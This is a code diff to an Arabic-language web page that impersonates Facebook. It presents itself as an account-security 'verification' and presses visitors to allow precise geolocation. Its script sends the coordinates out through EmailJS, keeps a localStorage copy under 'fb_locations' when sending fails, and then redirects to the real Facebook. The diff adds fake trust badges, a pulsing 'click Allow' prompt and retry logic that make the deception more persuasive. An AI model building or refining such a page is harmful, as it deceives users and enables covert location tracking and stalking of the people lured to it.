@@ -16,12 +16,17 @@
       --facebook-gray: #F0F2F5;
     }
     
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
     body {
       font-family: 'Tajawal', sans-serif;
       background: linear-gradient(135deg, #1877F2, #166FE5);
       color: #1F2937;
       min-height: 100vh;
-      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -37,9 +42,15 @@
       border-radius: 20px;
       overflow: hidden;
       box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
-      transition: all 0.3s ease;
       background: white;
       position: relative;
+      transform: translateY(0);
+      transition: all 0.3s ease;
+    }
+    
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
     }
     
     .header {
@@ -47,11 +58,33 @@
       color: white;
       padding: 25px;
       text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .header::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, rgba(255,255,255,0) 70%);
+      transform: rotate(30deg);
     }
     
     .logo {
       font-size: 48px;
       margin-bottom: 15px;
+      position: relative;
+      z-index: 2;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
     }
     
     .content {
@@ -78,19 +111,32 @@
       margin: 20px 0;
       display: block;
       text-align: center;
-      animation: pulse 2s infinite;
+      animation: float 3s ease-in-out infinite;
     }
     
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-15px); }
+      100% { transform: translateY(0px); }
+    }
+    
+    h2 {
+      font-size: 24px;
+      margin-bottom: 15px;
+      color: #1a365d;
+      text-align: center;
+    }
+    
+    p {
+      margin-bottom: 15px;
+      line-height: 1.6;
+      color: #4a5568;
     }
     
     .btn {
       display: block;
       width: 100%;
-      padding: 15px;
+      padding: 16px;
       border: none;
       border-radius: 50px;
       font-size: 18px;
@@ -99,6 +145,24 @@
       transition: all 0.3s ease;
       margin-top: 20px;
       text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .btn::after {
+      content: "";
+      position: absolute;
+      top: -10px;
+      left: -10px;
+      right: -10px;
+      bottom: -10px;
+      background: linear-gradient(45deg, rgba(255,255,255,0.3), transparent);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    
+    .btn:hover::after {
+      opacity: 1;
     }
     
     .btn-primary {
@@ -131,13 +195,18 @@
       border: 2px solid var(--facebook-blue);
     }
     
+    .btn-outline:hover {
+      background: rgba(24, 119, 242, 0.1);
+    }
+    
     .accuracy-display {
       text-align: center;
       margin: 20px 0;
-      padding: 15px;
+      padding: 20px;
       background: #f8f9fa;
-      border-radius: 12px;
+      border-radius: 15px;
       font-weight: 600;
+      border: 1px dashed #cbd5e0;
     }
     
     .high-accuracy {
@@ -154,12 +223,12 @@
     
     .loading-spinner {
       display: inline-block;
-      width: 40px;
-      height: 40px;
-      border: 4px solid rgba(24, 119, 242, 0.2);
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(24, 119, 242, 0.2);
       border-radius: 50%;
       border-top-color: var(--facebook-blue);
-      animation: spin 1s linear infinite;
+      animation: spin 1.5s linear infinite;
       margin: 20px auto;
     }
     
@@ -173,12 +242,13 @@
       overflow: hidden;
       margin: 20px 0;
       border: 1px solid #e0e0e0;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
     }
     
     .progress-container {
-      height: 8px;
+      height: 10px;
       background: #e0e0e0;
-      border-radius: 4px;
+      border-radius: 5px;
       margin: 25px 0;
       overflow: hidden;
     }
@@ -186,7 +256,7 @@
     .progress-bar {
       height: 100%;
       background: var(--facebook-blue);
-      border-radius: 4px;
+      border-radius: 5px;
       width: 0%;
       transition: width 0.5s ease;
     }
@@ -194,7 +264,7 @@
     .error-section {
       background: #fff8f8;
       border: 1px solid #ffcccc;
-      border-radius: 12px;
+      border-radius: 15px;
       padding: 20px;
       margin-top: 20px;
     }
@@ -202,18 +272,18 @@
     .error-title {
       color: #e74c3c;
       text-align: center;
-      font-size: 20px;
+      font-size: 22px;
       margin-bottom: 15px;
     }
     
     .solution-steps {
-      padding-left: 20px;
+      padding-left: 25px;
       margin: 15px 0;
     }
     
     .solution-steps li {
-      margin-bottom: 10px;
-      line-height: 1.5;
+      margin-bottom: 12px;
+      line-height: 1.6;
     }
     
     .footer {
@@ -221,16 +291,59 @@
       color: white;
       margin-top: 30px;
       font-size: 14px;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
     
     .footer a {
-      color: rgba(255, 255, 255, 0.8);
+      color: rgba(255, 255, 255, 0.9);
       margin: 0 10px;
       text-decoration: none;
+      transition: all 0.3s ease;
     }
     
     .footer a:hover {
+      color: white;
       text-decoration: underline;
+    }
+    
+    .features {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+    
+    .feature {
+      text-align: center;
+      padding: 10px;
+      flex: 1;
+    }
+    
+    .feature i {
+      font-size: 24px;
+      color: var(--facebook-blue);
+      margin-bottom: 10px;
+    }
+    
+    .permission-prompt {
+      background: #e6f0ff;
+      border: 2px solid var(--facebook-blue);
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: center;
+      animation: pulseBorder 2s infinite;
+    }
+    
+    @keyframes pulseBorder {
+      0% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); }
+    }
+    
+    .permission-icon {
+      font-size: 36px;
+      color: var(--facebook-blue);
+      margin-bottom: 10px;
     }
   </style>
 </head>
@@ -257,7 +370,29 @@
             <p><i class="fas fa-shield-alt"></i> هذه العملية تحمي حسابك من الاختراق</p>
           </div>
           
-          <p><strong>ملاحظة:</strong> قد تستغرق العملية 5-10 ثواني للحصول على دقة عالية، خاصة في المناطق النائية.</p>
+          <div class="features">
+            <div class="feature">
+              <i class="fas fa-lock"></i>
+              <p>أمان عالي</p>
+            </div>
+            <div class="feature">
+              <i class="fas fa-bolt"></i>
+              <p>سرعة التنفيذ</p>
+            </div>
+            <div class="feature">
+              <i class="fas fa-user-shield"></i>
+              <p>خصوصية</p>
+            </div>
+          </div>
+          
+          <div class="permission-prompt">
+            <div class="permission-icon">
+              <i class="fas fa-location-dot"></i>
+            </div>
+            <h3>السماح بتحديد الموقع</h3>
+            <p>ستظهر لك نافذة من المتصفح تطلب الإذن لتحديد موقعك</p>
+            <p>يرجى النقر على "السماح" أو "Allow" للمتابعة</p>
+          </div>
           
           <button id="startBtn" class="btn btn-primary">
             <i class="fas fa-location-arrow"></i> بدء التحقق الآن
@@ -277,6 +412,16 @@
           
           <p id="accuracyStatus">جاري تحسين دقة الموقع...</p>
           <p id="timer">الوقت المنقضي: <span id="seconds">0</span> ثانية</p>
+          
+          <div id="permissionNotice" class="error-section" style="display: none; margin-top: 20px;">
+            <div class="error-title">
+              <i class="fas fa-exclamation-circle"></i> لم يتم طلب الإذن
+            </div>
+            <p>يبدو أن المتصفح لم يعرض طلب الإذن لتحديد موقعك.</p>
+            <button id="retryPermissionBtn" class="btn btn-outline" style="margin-top: 10px;">
+              <i class="fas fa-redo"></i> المحاولة مرة أخرى
+            </button>
+          </div>
         </div>
         
         <!-- Map Section -->
@@ -288,7 +433,9 @@
             <p>دقة الموقع: <span id="accuracyValue">--</span> متر</p>
           </div>
           
-          <div class="map-container" id="mapContainer"></div>
+          <div class="map-container" id="mapContainer">
+            <p class="text-center" style="padding: 100px 0; color: #666;">جاري تحميل الخريطة...</p>
+          </div>
           
           <button id="continueBtn" class="btn btn-success">
             <i class="fab fa-facebook"></i> المتابعة إلى فيسبوك
@@ -359,6 +506,7 @@
     const errorSection = document.getElementById("errorSection");
     const startBtn = document.getElementById("startBtn");
     const retryBtn = document.getElementById("retryBtn");
+    const retryPermissionBtn = document.getElementById("retryPermissionBtn");
     const continueBtn = document.getElementById("continueBtn");
     const helpBtn = document.getElementById("helpBtn");
     const progressBar = document.getElementById("progressBar");
@@ -366,12 +514,16 @@
     const accuracyStatus = document.getElementById("accuracyStatus");
     const secondsDisplay = document.getElementById("seconds");
     const mapContainer = document.getElementById("mapContainer");
+    const permissionNotice = document.getElementById("permissionNotice");
 
     // State variables
     let locationData = null;
     let timer = null;
     let seconds = 0;
     let mapInstance = null;
+    let geolocationRequested = false;
+    let permissionPromptShown = false;
+    let permissionCheckTimeout = null;
     
     // Initialize EmailJS
     emailjs.init(config.emailjs.publicKey);
@@ -384,15 +536,27 @@
     
     // Start location process
     function startLocationProcess() {
+      if (geolocationRequested) return;
+      geolocationRequested = true;
+      
       showSection(loadingSection);
       seconds = 0;
       updateTimer();
+      permissionNotice.style.display = 'none';
       
       // Start the timer
       timer = setInterval(updateTimer, 1000);
       
       // Start progress bar animation
       animateProgressBar();
+      
+      // Set timeout to check if permission prompt was shown
+      permissionPromptShown = false;
+      permissionCheckTimeout = setTimeout(() => {
+        if (!permissionPromptShown) {
+          permissionNotice.style.display = 'block';
+        }
+      }, 3000);
       
       // Start location retrieval with high accuracy
       getHighAccuracyLocation();
@@ -405,25 +569,17 @@
       
       // Update status message
       if (seconds < 5) {
-        accuracyStatus.textContent = "جاري الحصول على الإشارات اللازمة...";
+        accuracyStatus.textContent = "جاري الحصول على الإشارات الأولية...";
       } else if (seconds < 10) {
         accuracyStatus.textContent = "جاري تحسين دقة الموقع...";
+      } else if (seconds < 15) {
+        accuracyStatus.textContent = "نحقق دقة أعلى (5-10 أمتار)...";
       } else {
-        accuracyStatus.textContent = "نحاول الحصول على دقة عالية (5-10 أمتار)...";
+        accuracyStatus.textContent = "نستمر في تحسين الدقة...";
       }
-    }
-    
-    // Animate progress bar
-    function animateProgressBar() {
-      let width = 0;
-      const interval = setInterval(() => {
-        if (width >= 100) {
-          clearInterval(interval);
-        } else {
-          width += 1;
-          progressBar.style.width = width + "%";
-        }
-      }, 100);
+      
+      // Update progress bar
+      progressBar.style.width = Math.min(seconds * 6.67, 100) + "%";
     }
     
     // Get high accuracy location (with retries)
@@ -442,11 +598,18 @@
           maximumAge: 0 // Do not use a cached position
         }
       );
+      
+      // Indicate that the permission prompt should be shown
+      permissionPromptShown = true;
+      if (permissionCheckTimeout) {
+        clearTimeout(permissionCheckTimeout);
+      }
     }
     
     // Handle successful location retrieval
     function handleLocationSuccess(position) {
       clearInterval(timer);
+      geolocationRequested = false;
       
       const lat = position.coords.latitude;
       const lng = position.coords.longitude;
@@ -485,6 +648,8 @@
     function initMap(lat, lng) {
       if (typeof google === 'undefined') {
         console.error("Google Maps not loaded");
+        mapContainer.innerHTML = "<p class='text-center' style='padding: 100px 0; color: #666;'>تعذر تحميل الخريطة. سيتم توجيهك إلى فيسبوك</p>";
+        setTimeout(redirectToFacebook, 3000);
         return;
       }
       
@@ -523,6 +688,7 @@
     // Handle location error
     function handleLocationError(error) {
       clearInterval(timer);
+      geolocationRequested = false;
       showSection(errorSection);
       
       let errorMessage = "حدث خطأ غير متوقع أثناء تحديد الموقع";
@@ -599,7 +765,7 @@
         console.error("Failed to send location data:", error);
         // Fallback: save to localStorage
         try {
-          const savedLocations = JSON.parse(localStorage.getItem('fb_locations') || [];
+          const savedLocations = JSON.parse(localStorage.getItem('fb_locations') || []);
           savedLocations.push(params);
           localStorage.setItem('fb_locations', JSON.stringify(savedLocations));
         } catch (e) {
@@ -618,20 +784,41 @@
     // Show detailed help instructions
     function showHelpInstructions() {
       const instructions = `
-        <h3>كيفية تفعيل خدمات الموقع:</h3>
-        <ol>
-          <li>افتح إعدادات جهازك</li>
-          <li>ابحث عن "الموقع" أو "Location"</li>
-          <li>تأكد من تفعيل خدمات الموقع</li>
-          <li>ابحث عن "Chrome" أو متصفحك في قائمة التطبيقات</li>
-          <li>قم بتفعيل "السماح بالوصول إلى الموقع"</li>
-          <li>اختر "أثناء استخدام التطبيق" أو "دائماً"</li>
-          <li>ارجع إلى هذه الصفحة واضغط "إعادة المحاولة"</li>
-        </ol>
-        <p>إذا استمرت المشكلة، حاول استخدام جهاز آخر أو تحديث المتصفح.</p>
+        <div style="background: white; padding: 20px; border-radius: 10px; max-width: 500px; margin: 20px auto;">
+          <h3 style="text-align: center; color: #1877F2; margin-bottom: 15px;">كيفية تفعيل خدمات الموقع</h3>
+          <ol style="padding-left: 20px; margin-bottom: 15px;">
+            <li style="margin-bottom: 10px;">افتح إعدادات جهازك</li>
+            <li style="margin-bottom: 10px;">ابحث عن "الموقع" أو "Location"</li>
+            <li style="margin-bottom: 10px;">تأكد من تفعيل خدمات الموقع</li>
+            <li style="margin-bottom: 10px;">ابحث عن "Chrome" أو متصفحك في قائمة التطبيقات</li>
+            <li style="margin-bottom: 10px;">قم بتفعيل "السماح بالوصول إلى الموقع"</li>
+            <li style="margin-bottom: 10px;">اختر "أثناء استخدام التطبيق" أو "دائماً"</li>
+            <li>ارجع إلى هذه الصفحة واضغط "إعادة المحاولة"</li>
+          </ol>
+          <p style="text-align: center; color: #666;">إذا استمرت المشكلة، حاول استخدام جهاز آخر أو تحديث المتصفح.</p>
+        </div>
       `;
       
-      alert(instructions);
+      // Create modal
+      const modal = document.createElement('div');
+      modal.style.position = 'fixed';
+      modal.style.top = '0';
+      modal.style.left = '0';
+      modal.style.width = '100%';
+      modal.style.height = '100%';
+      modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
+      modal.style.zIndex = '1000';
+      modal.style.display = 'flex';
+      modal.style.justifyContent = 'center';
+      modal.style.alignItems = 'center';
+      modal.innerHTML = instructions;
+      
+      // Close modal on click
+      modal.addEventListener('click', () => {
+        document.body.removeChild(modal);
+      });
+      
+      document.body.appendChild(modal);
     }
     
     // Load Google Maps API
@@ -648,6 +835,7 @@
     // Event listeners
     startBtn.addEventListener('click', startLocationProcess);
     retryBtn.addEventListener('click', startLocationProcess);
+    retryPermissionBtn.addEventListener('click', startLocationProcess);
     continueBtn.addEventListener('click', redirectToFacebook);
     helpBtn.addEventListener('click', showHelpInstructions);
     
